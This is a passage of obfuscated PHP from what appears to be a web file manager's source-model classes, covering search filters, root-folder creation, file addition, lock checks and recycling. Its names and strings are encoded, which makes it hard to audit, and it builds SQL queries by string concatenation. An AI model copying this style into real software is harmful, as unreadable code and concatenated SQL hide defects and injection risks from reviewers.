$î‚é³ó€[$–½˜Â¶¶[844]]); } if (isset($î‚é³ó€[$–½˜Â¶¶[845]]) && $î‚é³ó€[$–½˜Â¶¶[845]]) { $­ï€Ø®· = array($–½˜Â¶¶[2266], $î‚é³ó€[$–½˜Â¶¶[845]]); if ($–¡üÆ”[$–½˜Â¶¶[88]]) { $–¡üÆ”[$–½˜Â¶¶[88]] = array($–¡üÆ”[$–½˜Â¶¶[88]], $­ï€Ø®·, $–½˜Â¶¶[2267]); } else { $–¡üÆ”[$–½˜Â¶¶[88]] = $­ï€Ø®·; } } if (isset($î‚é³ó€[$–½˜Â¶¶[2259]]) && $î‚é³ó€[$–½˜Â¶¶[2259]] > 0) { $–¡üÆ”[$–½˜Â¶¶[79]] = array($–½˜Â¶¶[2265], $î‚é³ó€[$–½˜Â¶¶[2259]]); } if (isset($î‚é³ó€[$–½˜Â¶¶[2260]]) && $î‚é³ó€[$–½˜Â¶¶[2260]]) { $­ï€Ø®· = array($–½˜Â¶¶[2266], $î‚é³ó€[$–½˜Â¶¶[2260]]); if ($–¡üÆ”[$–½˜Â¶¶[79]]) { $–¡üÆ”[$–½˜Â¶¶[79]] = array($–¡üÆ”[$–½˜Â¶¶[79]], $­ï€Ø®·, $–½˜Â¶¶[2267]); } else { $–¡üÆ”[$–½˜Â¶¶[79]] = $­ï€Ø®·; } } if (isset($î‚é³ó€[$–½˜Â¶¶[670]]) && $î‚é³ó€[$–½˜Â¶¶[670]]) { $–¡üÆ”[] = array($–½˜Â¶¶[532] => $î‚é³ó€[$–½˜Â¶¶[670]], $–½˜Â¶¶[530] => $î‚é³ó€[$–½˜Â¶¶[670]], $–½˜Â¶¶[1087] => $–½˜Â¶¶[2087]); } if (isset($î‚é³ó€[$–½˜Â¶¶[489]]) && $î‚é³ó€[$–½˜Â¶¶[489]]) { $üÀ£¯ ë = $î‚é³ó€[$–½˜Â¶¶[489]]; if ($üÀ£¯ ë == $–½˜Â¶¶[78]) { $–¡üÆ”[$–½˜Â¶¶[488]] = 1; } else { if ($üÀ£¯ ë == $–½˜Â¶¶[2268]) { $–¡üÆ”[$–½˜Â¶¶[488]] = 0; } else { if ($üÀ£¯ ë) { $üÀ£¯ ë = is_array($üÀ£¯ ë) ? $üÀ£¯ ë : explode($–½˜Â¶¶[50], $üÀ£¯ ë); $–¡üÆ”[$–½˜Â¶¶[489]] = array($–½˜Â¶¶[495], $üÀ£¯ ë); $–¡üÆ”[$–½˜Â¶¶[488]] = 0; } } } } $this->_parseSearchParent($î‚é³ó€, $–¡üÆ”); if (isset($î‚é³ó€[$–½˜Â¶¶[2083]]) && trim($î‚é³ó€[$–½˜Â¶¶[2083]])) { $Ë·Ñ’­× = trim($î‚é³ó€[$–½˜Â¶¶[2083]]); $Ê¬şûøË = explode($–½˜Â¶¶[53], $Ë·Ñ’­×); if (strlen($Ë·Ñ’­×) > 2 && (substr($Ë·Ñ’­×, 0, 1) == $–½˜Â¶¶[121] && substr($Ë·Ñ’­×, -1) == $–½˜Â¶¶[121]) || substr($Ë·Ñ’­×, 0, 1) == $–½˜Â¶¶[58] && substr($Ë·Ñ’­×, -1) == $–½˜Â¶¶[58]) { $Ë·Ñ’­× = substr($Ë·Ñ’­×, 1, -1); $Ê¬şûøË = array($Ë·Ñ’­×); } $–¡üÆ”[$–½˜Â¶¶[32]] = array(array($–½˜Â¶¶[620], $–½˜Â¶¶[2085] . $Ë·Ñ’­× . $–½˜Â¶¶[2085])); if (count($Ê¬şûøË) > 1) { $–¡üÆ”[$–½˜Â¶¶[32]] = array(); foreach ($Ê¬şûøË as $œ£™æ›) { if (!trim($œ£™æ›)) { continue; } $–¡üÆ”[$–½˜Â¶¶[32]][] = array($–½˜Â¶¶[620], $–½˜Â¶¶[2085] . trim($œ£™æ›) . $–½˜Â¶¶[2085]); } } } return $–¡üÆ”; } private function _parseSearchParent($¡ãìÜãÉ, &$°„±©ïú) { $€Ë‘«¨ =& $_SERVER[«òÑğ]; if (!isset($¡ãìÜãÉ[$€Ë‘«¨[193]]) || !$¡ãìÜãÉ[$€Ë‘«¨[193]]) { return; } $‚·ßé¦ = $this->pathInfo($¡ãìÜãÉ[$€Ë‘«¨[193]]); $óÒ™ò¡Å = $‚·ßé¦[$€Ë‘«¨[193]] . $€Ë‘«¨[12] === $€Ë‘«¨[231]; $éËÌà±§ = $‚·ßé¦[$€Ë‘«¨[191]] == $€Ë‘«¨[583]; if ($‚·ßé¦[$€Ë‘«¨[599]] == $€Ë‘«¨[600]) { $Š¼óÊâ = $this->sourceInfo($¡ãìÜãÉ[$€Ë‘«¨[193]]); $‚·ßé¦[$€Ë‘«¨[589]] = $Š¼óÊâ[$€Ë‘«¨[589]]; } $°„±©ïú[$€Ë‘«¨[660]] = array($€Ë‘«¨[620], $‚·ßé¦[$€Ë‘«¨[589]] . $¡ãìÜãÉ[$€Ë‘«¨[193]] . $€Ë‘«¨[621]); $Ğ²°Æ¬ = isset($¡ãìÜãÉ[$€Ë‘«¨[1943]]) && in_array($€Ë‘«¨[583], $¡ãìÜãÉ[$€Ë‘«¨[1943]]); if (!$Ğ²°Æ¬ || !$éËÌà±§ || !$óÒ™ò¡Å || !$‚·ßé¦[$€Ë‘«¨[490]]) { return; } if (!AuthModel::authCheckRoot($‚·ßé¦[$€Ë‘«¨[490]][$€Ë‘«¨[491]])) { return; } $ÉŒÌáôß = $‚·ßé¦[$€Ë‘«¨[574]] . $€Ë‘«¨[12]; if ($ÉŒÌáôß == $€Ë‘«¨[91]) { unset($°„±©ïú[$€Ë‘«¨[660]]); $°„±©ïú[$€Ë‘«¨[191]] = self::TYPE_GROUP; return; } $ıÃŠÒĞÁ = Model($€Ë‘«¨[590])->groupChildrenAll($ÉŒÌáôß); $­û‰ò = count($ıÃŠÒĞÁ); if ($­û‰ò <= 1) { return; } $¹µü¼õ = array($€Ë‘«¨[193] => 0, $€Ë‘«¨[191] => self::TYPE_GROUP, $€Ë‘«¨[574] => array($€Ë‘«¨[7], $ıÃŠÒĞÁ)); $´¤¡Èƒ = $this->field($€Ë‘«¨[2269])->where($¹µü¼õ)->limit($­û‰ò)->select(); $°„±©ïú[$€Ë‘«¨[660]] = array(); foreach ($´¤¡Èƒ as $Â‘Şüá­) { $°„±©ïú[$€Ë‘«¨[660]][] = array($€Ë‘«¨[620], $€Ë‘«¨[598] . $Â‘Şüá­[$€Ë‘«¨[194]] . $€Ë‘«¨[621]); } $°„±©ïú[$€Ë‘«¨[660]][] = $€Ë‘«¨[2087]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ÈàÙ²¼±) { $©ÁğÕ =& $_SERVER[«òÑğ]; $¸ú±¦Œ§ = Model($©ÁğÕ[582])->where(array($©ÁğÕ[1775] => $ÈàÙ²¼±))->find(); $¯èó—° = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÈàÙ²¼±, $¸ú±¦Œ§[$©ÁğÕ[32]]); $this->userDesktopAdd($¯èó—°); return $¯èó—°; } public function userDesktopAdd($ïåÃçµ) { $¸å¼ÁÃÂ =& $_SERVER[«òÑğ]; $ıĞ·›š = LNG($¸å¼ÁÃÂ[2270]); $Ó°ßüÏ¡ = $this->mkdir($ïåÃçµ, $ıĞ·›š); $this->metaSet($Ó°ßüÏ¡, $¸å¼ÁÃÂ[2271], $¸å¼ÁÃÂ[91]); $this->metaSet($ïåÃçµ, $¸å¼ÁÃÂ[2272], $Ó°ßüÏ¡); } public function userPathSafeAdd($¦°şĞñ¹) { $¥üÒÑƒª =& $_SERVER[«òÑğ]; $¹ëîã‰ = Model($¥üÒÑƒª[582])->getInfoFull($¦°şĞñ¹); if (!$¹ëîã‰) { return !1; } if (_get($¹ëîã‰, $¥üÒÑƒª[603])) { return $¹ëîã‰[$¥üÒÑƒª[544]][$¥üÒÑƒª[2273]]; } $‚ú¸Ü»ê = $this->_mkdirRoot(SourceModel::TYPE_USER, $¦°şĞñ¹, $¥üÒÑƒª[2274], $¥üÒÑƒª[2275]); Model($¥üÒÑƒª[582])->metaSet($¦°şĞñ¹, $¥üÒÑƒª[2273], $‚ú¸Ü»ê); $this->metaSet($‚ú¸Ü»ê, $¥üÒÑƒª[2276], $¦°şĞñ¹); return $‚ú¸Ü»ê; } public function userPathAppAdd($¹‹ÉßÒª, $ÉøÁ“Éß = '', $„¼¥ÕÌÀ = '') { $íÊˆ™î½ =& $_SERVER[«òÑğ]; $ÓÏÛÀËä = Model($íÊˆ™î½[582])->getInfoFull($¹‹ÉßÒª); if (!$ÓÏÛÀËä) { return !1; } $ÔôÑÙ•ê = $ÓÏÛÀËä[$íÊˆ™î½[544]] ? $ÓÏÛÀËä[$íÊˆ™î½[544]] : array(); $ĞıÂïà = $ÔôÑÙ•ê[$íÊˆ™î½[2277]]; if (!$ĞıÂïà) { $ĞıÂïà = $this->_mkdirRoot(SourceModel::TYPE_USER, $¹‹ÉßÒª, $íÊˆ™î½[2278], $íÊˆ™î½[2279]); Model($íÊˆ™î½[582])->metaSet($¹‹ÉßÒª, $íÊˆ™î½[2277], $ĞıÂïà . $íÊˆ™î½[12]); $this->metaSet($ĞıÂïà, $íÊˆ™î½[2277], $¹‹ÉßÒª); } if (!$ÉøÁ“Éß) { return $ĞıÂïà; } $¥ììÎÖ = $ÔôÑÙ•ê[$íÊˆ™î½[2280] . $ÉøÁ“Éß]; if (!$¥ììÎÖ) { $¥ììÎÖ = $this->mkdir($ĞıÂïà, $ÉøÁ“Éß); Model($íÊˆ™î½[582])->metaSet($¹‹ÉßÒª, $íÊˆ™î½[2280] . $ÉøÁ“Éß, $¥ììÎÖ); $this->metaSet($¥ììÎÖ, $íÊˆ™î½[2280] . $ÉøÁ“Éß, $¹‹ÉßÒª); } if (!$„¼¥ÕÌÀ) { return $¥ììÎÖ; } $”­¤Ü = $this->mkdir($¥ììÎÖ, $„¼¥ÕÌÀ); return $”­¤Ü; } public function groupRootAdd($Ø¦£±Ëç) { $­öğ×„î =& $_SERVER[«òÑğ]; $Ã±äáç¾ = Model($­öğ×„î[590])->where(array($­öğ×„î[2077] => $Ø¦£±Ëç))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Ø¦£±Ëç, $Ã±äáç¾[$­öğ×„î[32]]); } public function systemRootPathAdd($¡ìÄŸ‡Ë) { if ($¡ìÄŸ‡Ë != $_SERVER[«òÑğ][613]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $¡ìÄŸ‡Ë); } public function userRootRemove($µ¹ŠËûœ) { $”Ü¨Æûû = $this->targetSourceRoot(SourceModel::TYPE_USER, $µ¹ŠËûœ, !0); foreach ($”Ü¨Æûû as $ı“¡Ùşı) { if (!$ı“¡Ùşı) { continue; } $this->remove($ı“¡Ùşı[$_SERVER[«òÑğ][194]], !1); } } public function groupRootRemove($›¥êŠ) { $«£Øş«Ô = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $›¥êŠ); if (!$«£Øş«Ô) { return; } $this->remove($«£Øş«Ô[$_SERVER[«òÑğ][194]], !1); } private function _mkdirRoot($¶ïÀş, $´¥°³Ç‹, $á—Ééİ, $Âî„² = '') { $§ì•Ğá‰ =& $_SERVER[«òÑğ]; $Ú¿ÊÕí  = defined($§ì•Ğá‰[2215]) ? USER_ID : 0; $’ÕåÇ¹Ş = array($§ì•Ğá‰[480] => 0, $§ì•Ğá‰[656] => $¶ïÀş, $§ì•Ğá‰[657] => $´¥°³Ç‹, $§ì•Ğá‰[654] => 1, $§ì•Ğá‰[658] => $Ú¿ÊÕí , $§ì•Ğá‰[659] => $Ú¿ÊÕí , $§ì•Ğá‰[655] => $Âî„², $§ì•Ğá‰[660] => $§ì•Ğá‰[598], $§ì•Ğá‰[507] => 0, $§ì•Ğá‰[625] => 0, $§ì•Ğá‰[547] => 0, $§ì•Ğá‰[661] => $§ì•Ğá‰[12]); if ($õ•‹„º“ = $this->where($’ÕåÇ¹Ş)->find()) { return $õ•‹„º“[$§ì•Ğá‰[194]]; } $õÂëÏç‰ = "\x4d\x6f\144\x65\x6c\123\157\165\162\143\145\x2e\155\x6b\x64\x69\162\122\157\x6f\164\56{$¶ïÀş}\x2e{$´¥°³Ç‹}\56" . $á—Ééİ; CacheLock::lock($õÂëÏç‰); $’ÕåÇ¹Ş[$§ì•Ğá‰[32]] = $á—Ééİ; $ë œ¢Ë = $this->add($’ÕåÇ¹Ş); $ø€”§åÖ = array($§ì•Ğá‰[662] => short_id($ë œ¢Ë)); $this->where(array($§ì•Ğá‰[494] => $ë œ¢Ë))->save($ø€”§åÖ); CacheLock::unlock($õÂëÏç‰); return $ë œ¢Ë; } private function targetSourceRoot($ê‰™×ûû, $«ùşåüÇ, $ŒÀÆéşß = false) { $¼Ã‘¼Œ =& $_SERVER[«òÑğ]; $á²¯£¸ = array($¼Ã‘¼Œ[480] => 0, $¼Ã‘¼Œ[656] => $ê‰™×ûû, $¼Ã‘¼Œ[657] => $«ùşåüÇ); if ($ŒÀÆéşß) { $úŸƒ„É = $this->where($á²¯£¸)->select(); return $úŸƒ„É ? $úŸƒ„É : array(); } $¥“¢ñêÂ = $this->where($á²¯£¸)->find(); return $¥“¢ñêÂ ? $¥“¢ñêÂ : array(); } public function sourceRootGroup($ÜÜƒĞ) { $à°¼ú­Ã =& $_SERVER[«òÑğ]; if (is_string($ÜÜƒĞ)) { $ÜÜƒĞ = array($ÜÜƒĞ); } $Ò³Ó­Í„ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ÜÜƒĞ, $à°¼ú­Ã[223]); $Ïù¥ˆŒ = array($à°¼ú­Ã[448] => $Ò³Ó­Í„, $à°¼ú­Ã[445] => array($à°¼ú­Ã[842] => count($ÜÜƒĞ))); $this->_listDataApply($Ïù¥ˆŒ[$à°¼ú­Ã[448]]); $this->_listMake($Ïù¥ˆŒ); return array_to_keyvalue($Ïù¥ˆŒ[$à°¼ú­Ã[85]], $à°¼ú­Ã[574]); } public function mkfile($¾û‹üÓ, $ÙæÃõ¸ä, $Ú» Õ•¨ = '', $ÒŒ = REPEAT_RENAME) { $©ĞŠû»ñ =& $_SERVER[«òÑğ]; $åìòî = Model($©ĞŠû»ñ[682])->addFileByContent($Ú» Õ•¨, $ÙæÃõ¸ä); return $this->_createFileCall($¾û‹üÓ, $ÙæÃõ¸ä, $åìòî, $ÒŒ, $©ĞŠû»ñ[1441]); } public function addFile($éÖ¬ÓÈÔ, $ÜğÍÀ×, $²æå, $ÑÖ¶µî = false, $ı¦ä•Ÿ = REPEAT_RENAME) { $ »ªÆª = Model($_SERVER[«òÑğ][682])->addFile($ÜğÍÀ×, $²æå, $ÑÖ¶µî); return $this->_createFileCall($éÖ¬ÓÈÔ, $²æå, $ »ªÆª, $ı¦ä•Ÿ); } public function addFileByFileID($µ“Çíâ, $»¤Ó¥–, $ÕœªÜ»×, $Òº¢ø­ = REPEAT_RENAME) { $æ¥Œ‹„â =& $_SERVER[«òÑğ]; $‡‘¯ûåˆ = Model($æ¥Œ‹„â[682])->find($»¤Ó¥–); Model($æ¥Œ‹„â[682])->linkAdd($»¤Ó¥–); return $this->_createFileCall($µ“Çíâ, $ÕœªÜ»×, $‡‘¯ûåˆ, $Òº¢ø­); } public function addFileByRemote($ãÊ†ë‹æ, $ºèòÉşì, $Ã¶ş¸Ïı, $ãè«°ê‡ = array(), $íÄåè = REPEAT_RENAME) { $•û¿î¥Ö = Model($_SERVER[«òÑğ][682])->addFileByRemote($ºèòÉşì, $Ã¶ş¸Ïı, $ãè«°ê‡); return $this->_createFileCall($ãÊ†ë‹æ, $Ã¶ş¸Ïı, $•û¿î¥Ö, $íÄåè); } private function _createFileCall($å¹ß“Ÿ•, $Ìé…êÚ, $¼ïÂßÓ², $Ÿ»Ôòè‡, $ÆŸÖÌ”ñ = "\165\160\154\x6f\141\144") { $½ùÇúñå =& $_SERVER[«òÑğ]; if (!$¼ïÂßÓ²) { return !1; } $ÉÇÍ­¼ = !1; $this->setMasterDB(); $this->lockWriteStart($å¹ß“Ÿ•, $Ìé…êÚ); $¼´“ÙàË = $this->fileNameExist($å¹ß“Ÿ•, $Ìé…êÚ); $ÚÁ˜©ÛÕ = $this->_createFile($å¹ß“Ÿ•, $Ìé…êÚ, $¼ïÂßÓ², $Ÿ»Ôòè‡, $ÉÇÍ­¼); if (!$ÉÇÍ­¼) { Model($½ùÇúñå[549])->remove($¼ïÂßÓ²[$½ùÇúñå[546]]); } if ($ÉÇÍ­¼ && $ÚÁ˜©ÛÕ && $ÚÁ˜©ÛÕ != $¼´“ÙàË) { Model($½ùÇúñå[2242])->eventCreate($ÚÁ˜©ÛÕ, $ÆŸÖÌ”ñ); } $this->lockWriteEnd($å¹ß“Ÿ•, $Ìé…êÚ); return $ÚÁ˜©ÛÕ; } public function mkdir($¶–åÏÎÚ, $ëÍß¶šˆ, $õÀ·õ = REPEAT_SKIP) { $Áóêö”ş =& $_SERVER[«òÑğ]; $this->setMasterDB(); $…×³¾°Ï = $this->sourceInfo($¶–åÏÎÚ); if (!$…×³¾°Ï) { return !1; } $this->lockWriteStart($¶–åÏÎÚ, $ëÍß¶šˆ); if ($õÀ·õ !== !1) { $ø÷ıéâí = $this->fileNameExist($¶–åÏÎÚ, $ëÍß¶šˆ); if ($ø÷ıéâí && $õÀ·õ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($¶–åÏÎÚ, $ëÍß¶šˆ); return $ø÷ıéâí; } $ëÍß¶šˆ = $this->fileNameAuto($¶–åÏÎÚ, $ëÍß¶šˆ, $õÀ·õ); } $Œû¹Ü• = array($Áóêö”ş[654] => 1, $Áóêö”ş[497] => $ëÍß¶šˆ, $Áóêö”ş[655] => $Áóêö”ş[12], $Áóêö”ş[547] => 0, $Áóêö”ş[625] => 0); $ô¤¢¢ØÒ = $this->_addSource($Œû¹Ü•, $…×³¾°Ï); Model($Áóêö”ş[2242])->eventCreate($ô¤¢¢ØÒ, $Áóêö”ş[1442]); $this->lockWriteEnd($¶–åÏÎÚ, $ëÍß¶šˆ); return $ô¤¢¢ØÒ; } public function listSourceRoot($¦®È¤î, $À¨åêÛ‹, $¯°ÇÂÕÒ = "\x73\157\165\x72\143\x65\111\x44\54\x74\141\x72\x67\x65\x74\111\104\x2c\x73\151\x7a\x65") { $¼ªÑµÉ© =& $_SERVER[«òÑğ]; $¡È‘Ú¨Ä = $¼ªÑµÉ©[457]; $¿şƒŠñ = array(); $Ÿ¯ÚÊÖ = 1024 * 50; $›²Âí°ù = is_array($›²Âí°ù) ? $›²Âí°ù : array(); $¿•áË³¦ = count($À¨åêÛ‹); $ûÁ¡ÚÛÌ = $this->tablePrefix . $¼ªÑµÉ©[2281]; for ($¡ä“œ = 0; $¡ä“œ < $¿•áË³¦; $¡ä“œ++) { $—Æà€¤ = $À¨åêÛ‹[$¡ä“œ]; $¡È‘Ú¨Ä .= "\x53\105\x4c\105\x43\124\40\52\40\x46\x52\117\x4d\40\x28\x53\x45\114\105\103\x54\40{$¯°ÇÂÕÒ}\x20\106\122\117\115\x20\140{$ûÁ¡ÚÛÌ}\x60\40\x57\110\105\122\105\40"; $¡È‘Ú¨Ä .= "\x60\x70\x61\x72\145\156\164\x49\x44\x60\x3d\60\x20\101\x4e\104\40\140\x74\141\162\x67\x65\164\x49\104\140\75{$—Æà€¤}\x20\101\116\x44\40\x60\x74\141\x72\147\x65\x74\x54\171\x70\145\x60\x3d{$¦®È¤î}\40\x61\x6e\x64\x20\146\151\154\145\x54\171\x70\145\x3d\x27\x27\x20\154\x69\x6d\x69\164\40\61\51\40\x61\x73\x20\x74\142\x5f{$¡ä“œ}\40\125\x4e\111\117\x4e\40\101\x4c\114\40"; if ((strlen($¡È‘Ú¨Ä) >= $Ÿ¯ÚÊÖ || $¡ä“œ == $¿•áË³¦ - 1) && $¡È‘Ú¨Ä) { $¡È‘Ú¨Ä = substr($¡È‘Ú¨Ä, 0, -strlen($¼ªÑµÉ©[1125])); $ä¡ù¡ = $this->query($¡È‘Ú¨Ä); $¡È‘Ú¨Ä = $¼ªÑµÉ©[12]; $¿şƒŠñ = array_merge($¿şƒŠñ, $ä¡ù¡); } } return $¿şƒŠñ; } private function _createFile($ÒŸ¬¬Ä¿, $˜ù×Šö¡, $’Ğ÷ğø, $Úñ‰¥ô¯, &$Ï—¹³¹©) { $ŠˆóÄ› =& $_SERVER[«òÑğ]; $¸è÷Î†÷ = $this->sourceInfo($ÒŸ¬¬Ä¿); if (!$’Ğ÷ğø || !$¸è÷Î†÷) { return !1; } if ($Úñ‰¥ô¯ !== !1) { $Ş™”“²½ = $this->fileNameExist($ÒŸ¬¬Ä¿, $˜ù×Šö¡); } $Ï—¹³¹© = !0; if ($Úñ‰¥ô¯ && $Ş™”“²½) { if ($Úñ‰¥ô¯ == REPEAT_SKIP) { $Ï—¹³¹© = !1; return $Ş™”“²½; } else { if ($Úñ‰¥ô¯ == REPEAT_REPLACE) { $ıü÷ˆìÖ = $this->sourceInfo($Ş™”“²½); $±–¬¦Š¢ = $this->fileHistory($ıü÷ˆìÖ, $’Ğ÷ğø[$ŠˆóÄ›[546]], $’Ğ÷ğø[$ŠˆóÄ›[79]]); if (!$±–¬¦Š¢) { $Ï—¹³¹© = !1; } else { $this->folderSizeReset($ÒŸ¬¬Ä¿); } return $Ş™”“²½; } else { $˜ù×Šö¡ = $this->fileNameAuto($ÒŸ¬¬Ä¿, $˜ù×Šö¡, $Úñ‰¥ô¯, !1); } } } $ª…´ıò· = array($ŠˆóÄ›[654] => 0, $ŠˆóÄ›[497] => $˜ù×Šö¡, $ŠˆóÄ›[655] => substr(get_path_ext($˜ù×Šö¡), 0, 10), $ŠˆóÄ›[547] => $’Ğ÷ğø[$ŠˆóÄ›[546]], $ŠˆóÄ›[625] => $’Ğ÷ğø[$ŠˆóÄ›[79]]); $¾äÅÌù = $this->_addSource($ª…´ıò·, $¸è÷Î†÷); $this->folderSizeReset($ÒŸ¬¬Ä¿, intval($ª…´ıò·[$ŠˆóÄ›[79]])); return $¾äÅÌù; } protected function fileHistory($“¦õÌ·, $Òå—ƒ×ã, $‡ª’˜èï) { $¹¦ÚçÌ¢ =& $_SERVER[«òÑğ]; if ($“¦õÌ·[$¹¦ÚçÌ¢[546]] == $Òå—ƒ×ã) { return !1; } $this->checkLock($“¦õÌ·[$¹¦ÚçÌ¢[194]], $Òå—ƒ×ã); Model($¹¦ÚçÌ¢[2282])->addHistory($“¦õÌ·); $¿æ‚³Æı = array($¹¦ÚçÌ¢[659] => USER_ID, $¹¦ÚçÌ¢[501] => time(), $¹¦ÚçÌ¢[546] => $Òå—ƒ×ã, $¹¦ÚçÌ¢[79] => $‡ª’˜èï); $this->where(array($¹¦ÚçÌ¢[494] => $“¦õÌ·[$¹¦ÚçÌ¢[194]]))->save($¿æ‚³Æı); $this->sourceCacheClear($“¦õÌ·[$¹¦ÚçÌ¢[194]]); return !0; } public function checkLock($¯øÓŠ›, $Æ‚×¢Ê) { $»ÇìØšô =& $_SERVER[«òÑğ]; $Ä¢²ı¸ = $this->pathInfo($¯øÓŠ›); if (!$this->fileIsLock($Ä¢²ı¸, !0)) { return; } $—âî¥è = Session::get($»ÇìØšô[2283]); $ìÁâ¤ºĞ = substr($Ä¢²ı¸[$»ÇìØšô[32]], 0, -1 - strlen($Ä¢²ı¸[$»ÇìØšô[169]])) . $»ÇìØšô[1303] . $—âî¥è . $»ÇìØšô[10] . $Ä¢²ı¸[$»ÇìØšô[169]]; $–¬êòš¦ = Model($»ÇìØšô[682])->find($Æ‚×¢Ê); $this->_createFileCall($Ä¢²ı¸[$»ÇìØšô[193]], $ìÁâ¤ºĞ, $–¬êòš¦, REPEAT_REPLACE, $»ÇìØšô[1441]); $Ø¡ÂÉä­ = $Ä¢²ı¸[$»ÇìØšô[544]][$»ÇìØšô[618]]; $¸îÚ¿‰ = $Ø¡ÂÉä­[$»ÇìØšô[2284]] ? $Ø¡ÂÉä­[$»ÇìØšô[2284]] : $Ø¡ÂÉä­[$»ÇìØšô[32]]; show_json(LNG($»ÇìØšô[2285]) . $»ÇìØšô[2286] . LNG($»ÇìØšô[2287]) . $»ÇìØšô[2288] . $¸îÚ¿‰ . $»ÇìØšô[2289], !1); } public function fileIsLock($öó»šäñ, $ß»”îòÂ = false) { $¨öĞ§éÎ =& $_SERVER[«òÑğ]; if (!_get($öó»šäñ, $¨öĞ§éÎ[614], 0)) { return !1; } if ($öó»šäñ[$¨öĞ§éÎ[544]][$¨öĞ§éÎ[617]] != USER_ID) { return !0; } $§†öşŒ¤ = $GLOBALS[$¨öĞ§éÎ[6]][$¨öĞ§éÎ[92]][$¨öĞ§éÎ[615]]; if ($öó»šäñ[$¨öĞ§éÎ[544]][$¨öĞ§éÎ[616]] <= time() - $§†öşŒ¤) { $this->metaSet($öó»šäñ[$¨öĞ§éÎ[194]], $¨öĞ§éÎ[617], null); $this->metaSet($öó»šäñ[$¨öĞ§éÎ[194]], $¨öĞ§éÎ[616], null); } if ($ß»”îòÂ) { $this->metaSet($öó»šäñ[$¨öĞ§éÎ[194]], $¨öĞ§éÎ[616], time()); } return !1; } private function _addSource($‰±Ş–¬÷, $Ï´¨Ô×Ã) { $ÕØø¬§¾ =& $_SERVER[«òÑğ]; $ÑËç€öÁ = defined($ÕØø¬§¾[2215]) ? USER_ID : 0; $‹‘Œëì® = array($ÕØø¬§¾[656] => $Ï´¨Ô×Ã[$ÕØø¬§¾[191]], $ÕØø¬§¾[657] => $Ï´¨Ô×Ã[$ÕØø¬§¾[574]], $ÕØø¬§¾[658] => $ÑËç€öÁ, $ÕØø¬§¾[659] => $ÑËç€öÁ, $ÕØø¬§¾[480] => $Ï´¨Ô×Ã[$ÕØø¬§¾[194]], $ÕØø¬§¾[660] => $Ï´¨Ô×Ã[$ÕØø¬§¾[589]] . $Ï´¨Ô×Ã[$ÕØø¬§¾[194]] . $ÕØø¬§¾[50], $ÕØø¬§¾[507] => 0, $ÕØø¬§¾[661] => $ÕØø¬§¾[12]); $‰±Ş–¬÷ = array_merge($‹‘Œëì®, $‰±Ş–¬÷); $this->updateModifyTime($‰±Ş–¬÷[$ÕØø¬§¾[193]]); $ô‚ÓûÈ‚ = $ÕØø¬§¾[2290] . $Ï´¨Ô×Ã[$ÕØø¬§¾[194]]; if (isset(self::$cacheChildList[$ô‚ÓûÈ‚])) { unset(self::$cacheChildList[$ô‚ÓûÈ‚]); } static $çûÊ÷›Ğ = false; if (!$çûÊ÷›Ğ) { Hook::trigger($ÕØø¬§¾[644], $‰±Ş–¬÷); $çûÊ÷›Ğ = !0; } $ñ°‹ŠŸ„ = $this->add($‰±Ş–¬÷); $²ƒ•ê«Ü = array($ÕØø¬§¾[662] => short_id($ñ°‹ŠŸ„)); $this->where(array($ÕØø¬§¾[494] => $ñ°‹ŠŸ„))->save($²ƒ•ê«Ü); $this->setNamePinyin($ñ°‹ŠŸ„, $‰±Ş–¬÷[$ÕØø¬§¾[32]]); return $ñ°‹ŠŸ„; } public function remove($¶’ûŞ¹Á, $¯ŒĞ–ºá = true) { $…Œêš¡¯ =& $_SERVER[«òÑğ]; $‘ŒÂù‰ = $this->sourceInfo($¶’ûŞ¹Á); $Æö¬ı‘Ï = intval($‘ŒÂù‰[$…Œêš¡¯[191]]) === self::TYPE_SYSTEM; $ª¼ğºı = Model($…Œêš¡¯[511])->get($…Œêš¡¯[2291]) == $…Œêš¡¯[91]; if ($Æö¬ı‘Ï || $¯ŒĞ–ºá || !$ª¼ğºı) { return $this->removeNow($¶’ûŞ¹Á, $¯ŒĞ–ºá); } $¡ùò÷ô† = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $™·–¿Ôà = $‘ŒÂù‰[$…Œêš¡¯[191]] == self::TYPE_USER ? $…Œêš¡¯[670] : $…Œêš¡¯[583]; if ($™·–¿Ôà == $…Œêš¡¯[670]) { $¨°‘õô = Model($…Œêš¡¯[582])->getInfo($‘ŒÂù‰[$…Œêš¡¯[574]]); $’»¨Åõ… = !empty($¨°‘õô[$…Œêš¡¯[2284]]) ? $¨°‘õô[$…Œêš¡¯[2284]] : $¨°‘õô[$…Œêš¡¯[32]]; $’»¨Åõ… = $…Œêš¡¯[340] . $’»¨Åõ… . $…Œêš¡¯[2292] . $‘ŒÂù‰[$…Œêš¡¯[574]]; } else { $¨°‘õô = Model($…Œêš¡¯[590])->getInfo($‘ŒÂù‰[$…Œêš¡¯[574]]); $’»¨Åõ… = _get($¨°‘õô, $…Œêš¡¯[32]); $’»¨Åõ… = $…Œêš¡¯[176] . $’»¨Åõ… . $…Œêš¡¯[2293] . $‘ŒÂù‰[$…Œêš¡¯[574]]; } $´¡îÚÊí = $…Œêš¡¯[2294] . md5($’»¨Åõ…); CacheLock::lock($´¡îÚÊí); $™ğ¨™ÔØ = $this->fileNameExist($¡ùò÷ô†, $’»¨Åõ…); if (!$™ğ¨™ÔØ) { $™ğ¨™ÔØ = $this->mkdir($¡ùò÷ô†, $’»¨Åõ…, REPEAT_SKIP); $this->metaSet($™ğ¨™ÔØ, $…Œêš¡¯[2295], $™·–¿Ôà); $this->metaSet($™ğ¨™ÔØ, $…Œêš¡¯[2296], $‘ŒÂù‰[$…Œêš¡¯[574]]); if ($‘ŒÂù‰[$…Œêš¡¯[193]] != 0) { $this->metaSet($™ğ¨™ÔØ, $…Œêš¡¯[2297], _get($¨°‘õô, $…Œêš¡¯[2298])); } } CacheLock::unlock($´¡îÚÊí); $this->metaSet($¶’ûŞ¹Á, $…Œêš¡¯[2299], $‘ŒÂù‰[$…Œêš¡¯[193]]); $this->where(array($…Œêš¡¯[194] => $¶’ûŞ¹Á))->save(array($…Œêš¡¯[501] => time())); $this->recycleClear($‘ŒÂù‰); 